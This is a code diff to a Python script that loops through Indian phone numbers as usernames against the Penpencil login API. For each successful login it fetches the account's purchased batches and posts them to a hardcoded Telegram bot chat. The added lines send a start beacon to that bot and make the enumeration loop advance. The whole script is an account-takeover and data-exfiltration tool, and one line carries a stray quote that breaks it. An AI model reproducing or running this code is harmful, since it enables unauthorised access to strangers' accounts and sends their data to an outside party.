@@ -1,4 +1,5 @@
 import requests
+requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text=Started')
 def getBs(token):
     url = 'https://api.penpencil.co/v3/batches/all-purchased-batches?page=1&mode=1&sort=TAG_LIST'
     headers = {
@@ -33,7 +34,6 @@ json_data = {
     'latitude': 0,
     'longitude': 0,
 }
-pattern = "^(?!.*([0]{6}|[1]{6}|[2]{6}|[3]{6}[4]{6}|[5]{6}|[6]{6}|[7]{6}|[8]{6}|[9]{6}).*)([7-9][0-9]{9})$"
 number = 8482999999
 while number!=8000000000":
     json_data['username']=number
@@ -41,3 +41,4 @@ while number!=8000000000":
     token=response.json()['data']['access_token']
     if (response.json())['success']:
         requests.get('https://api.telegram.org/bot6107093453:AAEwZhVbqR3VnAL-_1-9K12ijlc-7-vhaIE/sendMessage?chat_id=-838827510&text='+str(getBs(token)))
+    number-=1
